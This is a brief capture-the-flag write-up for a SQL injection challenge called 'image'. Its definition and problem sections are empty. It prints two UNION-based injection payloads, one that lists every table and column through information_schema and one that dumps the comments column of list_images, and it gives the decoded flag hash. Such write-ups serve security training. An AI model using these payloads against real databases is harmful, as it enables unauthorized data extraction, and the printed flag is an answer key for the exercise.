## SQL_injection: image

### Definition


### Problem



### Solution



### FLAG

After getting all table names and their column names, we notice the existence of an `list_images` table with the following columns;

`id` `url` `title` `comment`

After injecting the following query: `1 or 1=1 UNION select title, comment FROM list_images`,
we found a hidden note (`If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`),
within the comments column.

`1928e8083cf461a51303633093573c46` =(md5)=> `albatroz` =(lowercase)=> `albatroz` =(Sh256)=> `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188` Ta-Duh!!

## Links

* []() -- 

## Notes

 * the QUERY we inject to get table names AND their column names in all databases from the SQL Server;

`
1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
`
